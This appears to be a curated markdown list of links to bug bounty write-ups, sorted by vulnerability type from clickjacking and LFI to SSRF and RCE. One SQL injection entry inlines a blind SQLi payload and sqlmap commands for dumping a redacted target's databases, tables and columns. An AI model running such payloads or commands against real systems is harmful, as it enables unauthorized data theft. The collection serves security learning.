- [Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/index.html)
- [Yet another Google Clickjacking](https://medium.com/@raushanraj_65039/google-clickjacking-6a04132b918a)
- [Redressing instagram leaking application tokens  via instagram clickjacking vulnerability](https://www.seekurity.com/blog/general/redressing-instagram-leaking-application-tokens-via-instagram-clickjacking-vulnerability/)
- [Self XSS to Good XSS and Clickjacking](https://medium.com/@arbazhussain/self-xss-to-good-xss-clickjacking-6db43b44777e)
- [Microsoft Yammer clickjacking exploiting HTML5 security features](https://www.seekurity.com/blog/general/microsoft-yammer-clickjacking-exploiting-html5-security-features/)
- [Firefox find my device clickjacking](https://www.seekurity.com/blog/general/firefox-find-my-device-service-clickjacking/)
- [Whatsapp Clickjacking vulnerability](https://www.seekurity.com/blog/general/whatsapp-clickjacking-vulnerability-yet-another-web-client-failure/)
- [Telegram WEB client clickjacking vulnerability](https://www.seekurity.com/blog/general/telegram-web-client-clickjacking-vulnerability/)
- [Facebook Clickjacking : how we put a new dress on facebook UI](https://www.seekurity.com/blog/write-ups/facebook-clickjacking-how-we-put-a-new-dress-on-facebook-ui/)

## Local File Inclusion (LFI)

- [RFI LFI Writeup](http://hassankhanyusufzai.com/RFI_LFI_writeup/)
- [My first LFI](https://cyberzombie.in/my-first-lfi/)
- [Bug bounty LFI at Google.com](https://medium.com/@vulnerabilitylabs/bug-bounty-lfi-at-google-com-3c2e17d8c912)
- [Google LFI on production servers in redacted.google.com](https://omespino.com/write-up-google-bug-bounty-lfi-on-production-servers-in-redacted-google-com-13337-usd/)
- [LFI to 10 server pwn](https://nirmaldahal.com.np/lfi-to-10-server-pwn/)
- [LFI in apigee portals](https://offensi.com/2019/01/31/lfi-in-apigee-portals/)
- [Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE](https://medium.com/@armaanpathan/chain-the-bugs-to-pwn-an-organisation-lfi-unrestricted-file-upload-remote-code-execution-93dfa78ecce)
- [How we got LFI in apache drill recom like a boss](https://medium.com/bugbountywriteup/how-we-got-lfi-in-apache-drill-recon-like-a-boss-6f739a79d87d)
- [Bugbounty journey from LFI to RCE](https://medium.com/@logicbomb_1/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899)
- [LFI to RCE on deutche telekom bugbounty](https://medium.com/@maxon3/lfi-to-command-execution-deutche-telekom-bug-bounty-6fe0de7df7a6)
- [From LFI to RCE via PHP sessions](https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)
- [magix bugbounty magix.com XSS RCE SQLI and LFI](https://www.rcesecurity.com/2014/04/magix-bug-bounty-magix-com-rce-sqli-and-xara-com-lfi-xss/)
- [LFI in nokia maps](http://blog.shashank.co/2013/10/lfi-in-nokia-maps.html)

## Subdomain Takeover 

- [How I bought my way to subdomain takeover on tokopedia](https://medium.com/bugbountywriteup/how-i-bought-my-way-to-subdomain-takeover-on-tokopedia-8c6697c85b4d)
- [Subdomain Takeover via pantheon](https://smaranchand.com.np/2019/12/subdomain-takeover-via-pantheon/)
- [Subdomain takeover : a unique way](https://www.mohamedharon.com/2019/11/subdomain-takeover-via.html)
- [Escalating subdomain takeover to steal sensitive stuff](https://blog.takemyhand.xyz/2019/05/escalating-subdomain-takeovers-to-steal.html)
- [Subdomain takeover awarded 200](https://medium.com/@friendly_/subdomain-takeover-awarded-200-8296f4abe1b0)
- [Subdomain takeover via wufoo service](https://www.mohamedharon.com/2019/02/subdomain-takeover-via-wufoo-service-in.html)
- [Subdomain takeover via Hubspot](https://www.mohamedharon.com/2019/02/subdomain-takeover-via-hubspot.html)
- [Souq.com subdomain takeover](https://www.mohamedharon.com/2019/02/souqcom-subdomain-takeover-via.html)
- [Subdomain takeover : new level](https://medium.com/bugbountywriteup/subdomain-takeover-new-level-43f88b55e0b2)
- [Subdomain takeover due to misconfigured project settings for custom domain](https://medium.com/@prial261/subdomain-takeover-dew-to-missconfigured-project-settings-for-custom-domain-46e90e702969)
- [Subdomain takeover via shopify vendor](https://www.mohamedharon.com/2018/10/subdomain-takeover-via-shopify-vendor.html)
- [Subdomain takeover via unsecured s3 bucket](https://blog.securitybreached.org/2018/09/24/subdomain-takeover-via-unsecured-s3-bucket/)
- [Subdomain takeover worth 200](https://medium.com/@alirazzaq/subdomain-takeover-worth-200-ed73f0a58ffe)
- [Subdomain takeover via campaignmonitor](https://www.mohamedharon.com/2018/09/subdomain-takeover-via-campaignmonitor.html)
- [How to do 55000 subdomain takeover in a blink of an eye](https://medium.com/@thebuckhacker/how-to-do-55-000-subdomain-takeover-in-a-blink-of-an-eye-a94954c3fc75)
- [Subdomain takeover Starbucks (Part 2)](https://0xpatrik.com/subdomain-takeover-starbucks-ii/)
- [Subdomain takeover Starbucks](https://0xpatrik.com/subdomain-takeover-starbucks/)
- [Uber wildcard subdomain takeover](https://blog.securitybreached.org/2017/11/20/uber-wildcard-subdomain-takeover)
- [Bugcrowd domain subdomain takeover vulnerability ](https://blog.securitybreached.org/2017/10/10/bugcrowds-domain-subdomain-takeover-vulnerability)
- [Subdomain takeover vulnerability (Lamborghini Hacked)](https://blog.securitybreached.org/2017/10/10/subdomain-takeover-lamborghini-hacked/)
- [Authentication bypass on uber's SSO via subdomain takeover](https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/)
- [Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com](https://www.arneswinnen.net/2016/11/authentication-bypass-on-sso-ubnt-com-via-subdomain-takeover-of-ping-ubnt-com/)

## Denial of Service (DOS)


- [Long String DOS](https://medium.com/@shahjerry33/long-string-dos-6ba8ceab3aa0)
- [AIRDOS](https://kishanbagaria.com/airdos/)
- [Denial of Service DOS vulnerability in script loader (CVE-2018-6389)](https://www.pankajinfosec.com/post/700-denial-of-service-dos-vulnerability-in-script-loader-php-cve-2018-6389)
- [Github actions DOS](https://blog.teddykatz.com/2019/11/12/github-actions-dos.html)
- [Application level denial of service](https://evanricafort.blogspot.com/2019/08/application-level-denial-of-service-dos.html)
- [Banner grabbing to DOS and memory corruption](https://medium.com/bugbountywriteup/banner-grabbing-to-dos-and-memory-corruption-2442b1c25bbb)
- [DOS across Facebook endpoints](https://medium.com/@maxpasqua/dos-across-facebook-endpoints-1d7d0bc27c7f)
- [DOS on WAF protected sites](https://www.hackerinside.me/2019/02/dos-on-waf-protected-sites-by-abusing.html)
- [DOS on Facebook android app using zero width no break characters ](https://medium.com/@kankrale.rahul/dos-on-facebook-android-app-using-65530-characters-of-zero-width-no-break-space-db41ca8ded89)
- [Whatsapp DOS vulnerability on android and iOS](https://medium.com/@pratheesh.p.narayanan/whatsapp-dos-vulnerability-on-android-ios-web-7628077d21d4)
- [Whatsapp DOS vulnerability in iOS android](https://medium.com/bugbountywriteup/whatsapp-dos-vulnerability-in-ios-android-d896f76d3253)

## Authentication Bypass 


- [Touch ID authentication Bypass on evernote and dropbox iOS apps](https://medium.com/@pig.wig45/touch-id-authentication-bypass-on-evernote-and-dropbox-ios-apps-7985219767b2)
- [Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect](https://xpoc.pro/oauth-authentication-bypass-on-airbnb-acquisition-using-weird-1-char-open-redirect/)
- [Two factor authentication bypass](https://gauravnarwani.com/two-factor-authentication-bypass/)
- [Instagram multi factor authentication bypass](https://medium.com/@vishnu0002/instagram-multi-factor-authentication-bypass-924d963325a1)
- [Authentication bypass in nodejs application](https://medium.com/@_bl4de/authentication-bypass-in-nodejs-application-a-bug-bounty-story-d34960256402)
- [Symantec authentication Bypass](https://artkond.com/2018/10/10/symantec-authentication-bypass/)
- [Authentication bypass in CISCO meraki](https://blog.takemyhand.xyz/2018/06/authentication-bypass-in-cisco-meraki.html)
- [Slack SAML authentocation bypass](https://blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html)
- [Authentication bypass on UBER's SSO](https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/)
- [Authentication Bypass on airbnb via oauth tokens theft](https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/)
- [Inspect element leads to stripe account lockout authentication Bypass](https://www.jonbottarini.com/2017/04/03/inspect-element-leads-to-stripe-account-lockout-authentication-bypass/)
- [Authentication bypass on SSO ubnt.com](https://www.arneswinnen.net/2016/11/authentication-bypass-on-sso-ubnt-com-via-subdomain-takeover-of-ping-ubnt-com/)

## SQL Injection(SQLI)

- [Tricky oracle SQLI situation](https://blog.yappare.com/2020/04/tricky-oracle-sql-injection-situation.html)
- [Exploiting “Google BigQuery” SQLI](https://hackemall.live/index.php/2020/03/31/akamai-web-application-firewall-bypass-journey-exploiting-google-bigquery-sql-injection-vulnerability/)
- [SQLI via stopping the redirection to a login page](https://medium.com/@St00rm/sql-injection-via-stopping-the-redirection-to-a-login-page-52b0792d5592)
- [Finding SQLI with white box analysis a recent bug example](https://medium.com/@frycos/finding-sql-injections-fast-with-white-box-analysis-a-recent-bug-example-ca449bce6c76)
- [Bypassing a crappy WAF to exploit a blind SQLI](https://robinverton.de/blog/2019/08/25/bug-bounty-bypassing-a-crappy-waf-to-exploit-a-blind-sql-injection/)
- [SQL Injection in private-site.com/login.php](https://www.mohamedharon.com/2019/07/sql-injection-in-private-sitecomloginphp.html)
- [Exploiting tricky blind SQLI](https://www.noob.ninja/2019/07/exploiting-tricky-blind-sql-injection.html)
- [SQLI in forget password fucntion](https://medium.com/@kgaber99/sql-injection-in-forget-password-function-3c945512e3cb)
- [SQLI Bug Bounty](https://medium.com/@ariffadhlullah2310/sql-injection-bug-bounty-110e92e71ec3)

  The scope is : *.xxxx.com
  I found the vulnerability is on api.xxx.com
  This is the raw that i got on burp
 
  GET /api/trend/get?locale=en_GB&device=desktop&uiv=4 HTTP/1.1
  Host: api.xxxx.com
  Content-Type: application/x-www-form-urlencoded
  Origin: https://www.xxx.com
  Connection: close
  blablabla
 
  This is my payload : locale=en_GB’) AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 4376 UNION SELECT 4107) END)) — BWMI&device=desktop&uiv=4
  
  1. i save the raw into the notepad as .txt format
  2. i run my sqlmap from my terminal (because i used mac. i use this only sqlmap -r /xxx/xxx/xxx/files.txt — dbs
  3. i got something cool stuff there i got the database
  4. and i try to get more than the dbs. i try to check the table first using this sqlmap -r /xxx/xxx/xxx/files.txt -D xxx — table
  5. i found a lot of table there but there is something interesting for me. Then i try to get the columns
  6. sqlmap -r /xxx/xxx/xxx/files.txt -D xxx -T xxx — columns
  7. i got the columns. very interesting then i try to got the field of DB
  8. TADAAAA i GOT what i want .
  
  ![sqlibugbounty](https://miro.medium.com/max/3000/1*45135uLkqPC6aeSwjQN34Q.png)

- [File Upload blind SQLI](https://jspin.re/fileupload-blind-sqli/)
- [SQL Injection](https://medium.com/@saadahmedx/sql-injection-c87a390afdd3)
- [SQLI through User Agent](https://medium.com/@frostnull1337/sql-injection-through-user-agent-44a1150f6888)
- [SQLI in insert update query without comma](https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/)
- [SQLI for 50 bounty](https://medium.com/@orthonviper/sql-injection-for-50-bounty-but-still-worth-reading-468442c1cc1a)
- [Abusing MYSQL CLients](https://www.vesiluoma.com/abusing-mysql-clients/)
- [SQLI Authentication Bypass AutoTrader Webmail](https://blog.securitybreached.org/2018/09/10/sqli-login-bypass-autotraders/)
- [ZOL Zimbabwe Authentication Bypass to XSS & SQLi](https://blog.securitybreached.org/2018/09/09/zol-zimbabwe-authbypass-sqli-xss/)
- [SQLI bootcamp.nutanix.com](https://blog.securitybreached.org/2018/09/08/sqli-bootcampnutanix-com-bug-bounty-poc/)
- [SQLI in University of Cambridge](https://medium.com/@adeshkolte/sql-injection-vulnerability-in-university-of-cambridge-b4c8d0381e1)
- [Making a blind SQLI a little less Blind SQLI](https://medium.com/@tomnomnom/making-a-blind-sql-injection-a-little-less-blind-428dcb614ba8)
- [SQLI amd silly WAF](https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html)
- [Attacking Postgresql Database](https://medium.com/@vishnu0002/attacking-postgresql-database-834a9a3471bc)
- [Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection](https://medium.com/@logicbomb_1/bugbounty-database-hacked-of-indias-popular-sports-company-bypassing-host-header-to-sql-7b9af997c610)
- [A 5 minute SQLI](https://medium.com/bugbountywriteup/a-five-minute-sql-i-16ab75b20fe4)
- [Union based SQLI writeup](https://medium.com/@nuraalamdipu/union-based-sql-injection-write-up-a-private-company-site-273f89a49ed9)
- [SQLI with load file and into outfile](https://medium.com/bugbountywriteup/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2)
- [SQLI is Everywhere](https://medium.com/@agrawalsmart7/sql-is-every-where-5cba6ae9480a)
- [SQLI in Update Query Bug](https://zombiehelp54.blogspot.com/2017/02/sql-injection-in-update-query-bug.html)
- [Blind SQLI Hootsuite](https://ahussam.me/Blind-sqli-Hootsuite/)
- [Yahoo – Root Access SQLI – tw.yahoo.com](https://buer.haus/2015/01/15/yahoo-root-access-sql-injection-tw-yahoo-com/)
- [Step by Step Exploiting SQLI in Oculus](https://josipfranjkovic.blogspot.com/2014/09/step-by-step-exploiting-sql-injection.html)
- [Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS)](https://www.rcesecurity.com/2014/04/magix-bug-bounty-magix-com-rce-sqli-and-xara-com-lfi-xss/)
- [Tesla Motors blind SQLI](https://bitquark.co.uk/blog/2014/02/23/tesla_motors_blind_sql_injection)
- [SQLI in Nokia Sites](https://josipfranjkovic.blogspot.com/2013/07/sql-injections-in-nokia-sites.html)

## 2FA related issues

- [2FA Bypass via logical rate limiting Bypass](https://medium.com/@jeppe.b.weikop/2fa-bypass-via-logical-rate-limiting-bypass-25ae2a4e1835)
- [Bypass 2FA in a website](https://medium.com/sourav-sahana/bypass-2fa-in-a-website-d616eaead1e3)
- [Weird and simple 2FA bypass](https://medium.com/@ultranoob/weird-and-simple-2fa-bypass-without-any-test-b869e09ac261)
- [How I cracked 2FA with simple factor bruteforce](https://medium.com/clouddevops/bugbounty-how-i-cracked-2fa-two-factor-authentication-with-simple-factor-brute-force-a1c0f3a2f1b4)
- [Instagram account is reactivated without entering 2FA](https://bugbountypoc.com/instagram-account-is-reactivated-without-entering-2fa/)
- [How to bypass 2FA with a HTTP header](https://medium.com/@YumiSec/how-to-bypass-a-2fa-with-a-http-header-ce82f7927893)
- [How I hacked 40k user accounts of microsoft using 2FA bypass outlook](https://medium.com/@goyalvartul/how-i-hacked-40-000-user-accounts-of-microsoft-using-2fa-bypass-outlook-live-com-13258785ec2f)
- [How I abused 2FA to maintain persistence after password recovery change google microsoft instragram](https://medium.com/@lukeberner/how-i-abused-2fa-to-maintain-persistence-after-a-password-change-google-microsoft-instagram-7e3f455b71a1)
- [Bypass hackerone 2FA ](https://medium.com/japzdivino/bypass-hackerone-2fa-requirement-and-reporter-blacklist-46d7959f1ee5)
- [Facebook Bug bounty  : How I was able to enumerate instagram accounts who had enabled 2FA](https://medium.com/@zk34911/facebook-bug-bounty-how-i-was-able-to-enumerate-instagram-accounts-who-had-enabled-2fa-two-step-fddba9e9741c)

## CORS related issues 

- [CORS bug on google's 404 page (rewarded)](https://medium.com/@jayateerthag/cors-bug-on-googles-404-page-rewarded-2163d58d3c8b)
- [CORS misconfiguration leading to private information disclosure](https://medium.com/@sasaxxx777/cors-misconfiguration-leading-to-private-information-disclosure-3034cfcb4b93)
- [CORS misconfiguration account takeover out of scope to grab items in scope](https://medium.com/@mashoud1122/cors-misconfiguration-account-takeover-out-of-scope-to-grab-items-in-scope-66d9d18c7a46)
- [Chrome CORS](https://blog.bi.tk/chrome-cors/)
- [Bypassing CORS](https://medium.com/@saadahmedx/bypassing-cors-13e46987a45b)
- [CORS to CSRF attack](https://medium.com/@osamaavvan/cors-to-csrf-attack-c33a595d441)
- [An unexploited CORS misconfiguration reflecting further issues](https://smaranchand.com.np/2019/05/an-unexploited-cors-misconfiguration-reflecting-further-issues/)
- [Think outside the scope advanced cors exploitation techniques](https://medium.com/@sandh0t/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
- [A simple CORS misconfiguration leaked private post of twitter facebook instagram](https://medium.com/@nahoragg/a-simple-cors-misconfig-leaked-private-post-of-twitter-facebook-instagram-5f1a634feb9d)
- [Explpoiting CORS misconfiguration](https://bugbaba.blogspot.com/2018/02/exploiting-cors-miss-configuration.html)
- [Full account takeover through CORS with connection sockets](https://medium.com/@saamux/full-account-takeover-through-cors-with-connection-sockets-179133384815)
- [Exploiting insecure CORS API api.artsy.net](https://blog.securitybreached.org/2017/10/10/exploiting-insecure-cross-origin-resource-sharing-cors-api-artsy-net)
- [Pre domain wildcard CORS exploitation](https://medium.com/bugbountywriteup/pre-domain-wildcard-cors-exploitation-2d6ac1d4bd30)
- [Exploiting misconfigured CORS on popular BTC site](https://medium.com/@arbazhussain/exploiting-misconfigured-cors-on-popular-btc-site-2aedfff906f6)
- [Abusing CORS for an XSS on flickr](https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/)

## Server Side Request Forgery (SSRF)


- [Exploiting an SSRF trials and tribulations](https://medium.com/a-bugz-life/exploiting-an-ssrf-trials-and-tribulations-14c5d8dbd69a)
- [SSRF on PDF generator](https://medium.com/@michan001/ssrf-on-pdf-generator-36b81e16d67b)
- [Google VRP SSRF in Google cloud platform stackdriver](https://ngailong.wordpress.com/2019/12/19/google-vrp-ssrf-in-google-cloud-platform-stackdriver/)
- [Vimeo upload function SSRF](https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437)
- [SSRF via ffmeg processing](https://medium.com/@pflash0x0punk/ssrf-via-ffmpeg-hls-processing-a04e0288a8c5)
- [My first SSRF using DNS rebinding](https://geleta.eu/2019/my-first-ssrf-using-dns-rebinfing/)
- [Bugbounty simple SSRF](https://jin0ne.blogspot.com/2019/11/bugbounty-simple-ssrf.html)
- [SSRF reading local files from downnotifier server](https://www.openbugbounty.org/blog/leonmugen/ssrf-reading-local-files-from-downnotifier-server/)
- [SSRF vulnerability](https://evanricafort.blogspot.com/2019/08/ssrf-vulnerability-in.html)
- [Gain adfly SMTP access with SSRF via gopher protocol](https://medium.com/@androgaming1912/gain-adfly-smtp-access-with-ssrf-via-gopher-protocol-26a26d0ec2cb)
- [Blind SSRF in stripe.com due to senntry misconfiguration](https://medium.com/@0ktavandi/blind-ssrf-in-stripe-com-due-to-sentry-misconfiguration-60ebb6a40b5)
- [SSRF port issue hidden approch](https://medium.com/@w_hat_boy/server-side-request-forgery-ssrf-port-issue-hidden-approch-f4e67bd8cc86)
- [The jorney of web cache firewall bypass to SSRF to AWS credentials compromise](https://medium.com/@logicbomb_1/the-journey-of-web-cache-firewall-bypass-to-ssrf-to-aws-credentials-compromise-b250fb40af82)
- [SSRF to local file read and abusing aws metadata](https://medium.com/@pratiky054/ssrf-to-read-local-files-and-abusing-the-aws-metadata-8621a4bf382)
- [pdfreactor SSRF to root level local files read which lead to RCE](https://medium.com/@armaanpathan/pdfreacter-ssrf-to-root-level-local-file-read-which-led-to-rce-eb460ffb3129)
- [SSRF trick : SSRF XSPA in micosoft's bing webwaster](https://medium.com/@elberandre/ssrf-trick-ssrf-xspa-in-microsofts-bing-webmaster-central-8015b5d487fb)
- [Downnotifeer SSRF](https://m-q-t.github.io/notes/downnotifer-ssrf/)
- [Escalating SSRF to RCE](https://medium.com/cesppa/escalating-ssrf-to-rce-f28c482eb8b9)
- [Vimeo SSRF with code execution potential](https://medium.com/@rootxharsh_90844/vimeo-ssrf-with-code-execution-potential-68c774ba7c1e)
- [SSRF in slack](https://medium.com/@elberandre/1-000-ssrf-in-slack-7737935d3884)
- [Exploiting SSRF like a boss](https://medium.com/@zain.sabahat/exploiting-ssrf-like-a-boss-c090dc63d326)
- [AWS takeover SSRF javascript](http://10degres.net/aws-takeover-ssrf-javascript/)
- [Into the borg of SSRF inside google production network](https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/)
- [SSRF to local file disclosure](https://medium.com/@tungpun/from-ssrf-to-local-file-disclosure-58962cdc589f)
- [How I found an SSRF in yahoo guesthouse (recon wins)](https://medium.com/@th3g3nt3l/how-i-found-an-ssrf-in-yahoo-guesthouse-recon-wins-8722672e41d4)
- [Reading internal files using SSRF vulnerability](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
- [Airbnb chaining third party open redirect into SSRF via liveperson chat](https://buer.haus/2017/03/09/airbnb-chaining-third-party-open-redirect-into-server-side-request-forgery-ssrf-via-liveperson-chat/)


## Race Condition

- [Exploiting a Race condition vulnerabililty](https://medium.com/@vincenz/exploiting-a-race-condition-vulnerability-3f2cb387a72)
- [Race condition that could result to RCE a story with an app](https://medium.com/bugbountywriteup/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3)
- [Creating thinking is our everything : Race condition and business logic](https://medium.com/@04sabsas/bugbounty-writeup-creative-thinking-is-our-everything-race-condition-business-logic-error-2f3e82b9aa17)
- [Chaining improper authorization to Race condition to harvest credit card details](https://medium.com/@ciph3r7r0ll/chaining-improper-authorization-to-race-condition-to-harvest-credit-card-details-a-bug-bounty-effe6e0f5076)
- [A Race condition bug in Facebook chat groups](https://www.seekurity.com/blog/general/the-fuzz-the-bug-the-action-a-race-condition-bug-in-facebook-chat-groups-leads-to-spy-on-conversations/)
- [Race condition bypassing team limit](https://medium.com/@arbazhussain/race-condition-bypassing-team-limit-b162e777ca3b)
- [Race condition on web](https://www.josipfranjkovic.com/blog/race-conditions-on-web)
- [Race condition bugs on Facebook](https://josipfranjkovic.blogspot.com/2015/04/race-conditions-on-facebook.html)



## Remote Code Execution (RCE) 

- [Microsoft RCE bugbounty](https://blog.securitybreached.org/2020/03/31/microsoft-rce-bugbounty/)
- [OTP bruteforce account takeover](https://medium.com/@ranjitsinghnit/otp-bruteforce-account-takeover-faaac3d712a8)
- [Attacking helpdesk RCE chain on deskpro with bitdefender](https://blog.redforce.io/attacking-helpdesks-part-1-rce-chain-on-deskpro-with-bitdefender-as-case-study/)
- [Remote image upload leads to RCE inject malicious code](https://medium.com/@asdqwedev/remote-image-upload-leads-to-rce-inject-malicious-code-to-php-gd-image-90e1e8b2aada)
- [Finding a p1 in one minute with shodan.io RCE](https://medium.com/@sw33tlie/finding-a-p1-in-one-minute-with-shodan-io-rce-735e08123f52)
- [From recon to optimizing RCE results simple story with one of the biggest ICT company](https://medium.com/bugbountywriteup/from-recon-to-optimizing-rce-results-simple-story-with-one-of-the-biggest-ict-company-in-the-ea710bca487a)
- [Uploading backdoor for fun and profit RCE DB creds P1](https://medium.com/@mohdaltaf163/uploading-backdoor-for-fun-and-profit-rce-db-cred-p1-2cdaa00e2125)
- [Responsible Disclosure breaking out of a sandboxed editor to perform RCE](https://jatindhankhar.in/blog/responsible-disclosure-breaking-out-of-a-sandboxed-editor-to-perform-rce/)
- [Wordpress design flaw leads to woocommerce RCE](https://blog.ripstech.com/2018/wordpress-design-flaw-leads-to-woocommerce-rce/)
- [Path traversal while uploading results in RCE](https://blog.harshjaiswal.com/path-traversal-while-uploading-results-in-rce)
- [RCE jenkins instance](https://blog.securitybreached.org/2018/09/07/rce-jenkins-instance-dosomething-org-bug-bounty-poc/)
- [Traversing the path to RCE](https://hawkinsecurity.com/2018/08/27/traversing-the-path-to-rce/)
- [How I chained 4 bugs features into RCE on amazon](http://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html)
- [RCE due to showexceptions](https://sites.google.com/view/harshjaiswalblog/rce-due-to-showexceptions)
- [Yahoo luminate RCE](https://sites.google.com/securifyinc.com/secblogs/yahoo-luminate-rce)
- [Latex to RCE private bug bounty program](https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
- [How I got hall of fame in two fortune 500 companies an RCE story](https://medium.com/@emenalf/how-i-got-hall-of-fame-in-two-fortune-500-companies-an-rce-story-9c89cead81ff)
- [RCE by uploading a web config](https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/)
- [36k Google app engine RCE](https://sites.google.com/site/testsitehacking/-36k-google-app-engine-rce)
- [How I found 2.9 RCE at yahoo](https://medium.com/@kedrisec/how-i-found-2-9-rce-at-yahoo-bug-bounty-program-20ab50dbfac7)
- [Bypass firewall to get RCE](https://medium.com/@logicbomb_1/bugbounty-how-i-was-able-to-bypass-firewall-to-get-rce-and-then-went-from-server-shell-to-get-783f71131b94)
- [RCE vulnerabilite in yahoo subdomain](https://www.mohamedharon.com/2018/01/rce-vulnerabilite-in-yahoo-subdomain.html)
- [RCE in duolingos tinycards app from android](https://wwws.nightwatchcybersecurity.com/2018/01/04/rce-in-duolingos-tinycards-app-for-android-cve-2017-16905/)
- [Unrestricted file upload to RCE](https://blog.securitybreached.org/2017/12/19/unrestricted-file-upload-to-rce-bug-bounty-poc/)
- [Getting a RCE (CTF WAY)](https://medium.com/@uranium238/getting-a-rce-ctf-way-2fd612fb643f)
- [RCE starwars](https://blog.zsec.uk/rce-starwars/)
- [How I got 5500 from yahoo for RCE](https://medium.com/bugbountywriteup/how-i-got-5500-from-yahoo-for-rce-92fffb7145e6)
- [RCE in Addthis](https://whitehatnepal.tumblr.com/post/149933960267/rce-in-addthis)
- [Paypal RCE](https://artsploit.blogspot.com/2016/01/paypal-rce.html)
- [My First RCE (Stressed Employee gets me 2x bounty)](https://medium.com/@abhishake100/my-first-rce-stressed-employee-gets-me-2x-bounty-c4879c277e37)
- [Abusing ImageMagick to obtain RCE](https://strynx.org/imagemagick-rce/)
- [How Snapdeal Kept their Users Data at Risk!](https://medium.com/@nanda_kumar/bugbounty-how-snapdeal-indias-popular-e-commerce-website-kept-their-user-data-at-risk-3d02b4092d9c)
- [RCE via ImageTragick](https://rezo.blog/hacking/2019/11/29/rce-via-imagetragick.html)
- [How I Cracked 2FA with Simple Factor Brute-force!](https://medium.com/clouddevops/bugbounty-how-i-cracked-2fa-two-factor-authentication-with-simple-factor-brute-force-a1c0f3a2f1b4)
- [Found RCE but got Duplicated](https://medium.com/@smilehackerofficial/how-i-found-rce-but-got-duplicated-ea7b8b010990)
- [“Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores](https://blog.usejournal.com/how-recon-helped-samsung-protect-their-production-repositories-of-samsungtv-ecommerce-estores-4c51d6ec4fdd)
- [IDOR to RCE](https://www.rahulr.in/2019/10/idor-to-rce.html?m=1)
- [RCE on AEM instance without JAVA knowledge](https://medium.com/@byq/how-to-get-rce-on-aem-instance-without-java-knowledge-a995ceab0a83)
- [RCE with Flask Jinja tempelate Injection](https://medium.com/@akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870)
- [Race Condition that could result to RCE](https://medium.com/bugbountywriteup/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3)
- [Chaining Two 0-Days to Compromise An Uber Wordpress](https://www.rcesecurity.com/2019/09/H1-4420-From-Quiz-to-Admin-Chaining-Two-0-Days-to-Compromise-an-Uber-Wordpress/)
- [Oculus Identity Verification bypass through Brute Force](https://medium.com/@karthiksoft007/oculus-identity-verification-bypass-through-brute-force-dbd0c0d3c37e)
- [Used RCE as Root on marathon Instance](https://omespino.com/write-up-private-bug-bounty-usd-rce-as-root-on-marathon-instance/)
- [Two easy RCE in Atlassian Products](https://medium.com/@valeriyshevchenko/two-easy-rce-in-atlassian-products-e8480eacdc7f)
- [RCE in Ruby using mustache templates](https://rhys.io/post/rce-in-ruby-using-mustache-templates)
- [About a Sucuri RCE…and How Not to Handle Bug Bounty Reports](https://www.rcesecurity.com/2019/06/about-a-sucuri-rce-and-how-not-to-handle-bug-bounty-reports/)
- [Source code disclosure vulnerability](https://medium.com/@mohamedrserwah/source-code-disclose-vulnerability-b9e49584e2d2)
- [Bypassing custom Token Authentication in a Mobile App](https://medium.com/@dortz/how-did-i-bypass-a-custom-brute-force-protection-and-why-that-solution-is-not-a-good-idea-4bec705004f9)
- [Facebook’s Burglary Shopping List](https://www.7elements.co.uk/resources/blog/facebooks-burglary-shopping-list/)
- [From SSRF To RCE in PDFReacter](https://medium.com/@armaanpathan/pdfreacter-ssrf-to-root-level-local-file-read-which-led-to-rce-eb460ffb3129)
- [Apache strust RCE](https://www.mohamedharon.com/2019/04/apache-strust-rce.html)
- [Dell KACE K1000 Remote Code Execution](https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/)
- [Handlebars Tempelate Injection and RCE](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
- [Leaked Salesforce API access token at IKEA.com](https://medium.com/@jonathanbouman/leaked-salesforce-api-access-token-at-ikea-com-132eea3844e0)
- [Zero Day RCE on Mozilla's AWS Network](https://blog.assetnote.io/bug-bounty/2019/03/19/rce-on-mozilla-zero-day-webpagetest/)
- [Escalating SSRF to RCE](https://medium.com/cesppa/escalating-ssrf-to-rce-f28c482eb8b9)
- [Fixed : Brute-force Instagram account’s passwords](https://medium.com/@addictrao20/fixed-brute-force-instagram-accounts-passwords-938471b6e9d4)
- [Bug Bounty 101 — Always Check The Source Code](https://medium.com/@spazzyy/bug-bounty-101-always-check-the-source-code-1adaf3f59567)
- [ASUS RCE vulnerability on rma.asus-europe.eu](https://mustafakemalcan.com/asus-rce-vulnerability-on-rma-asus-europe-eu/)
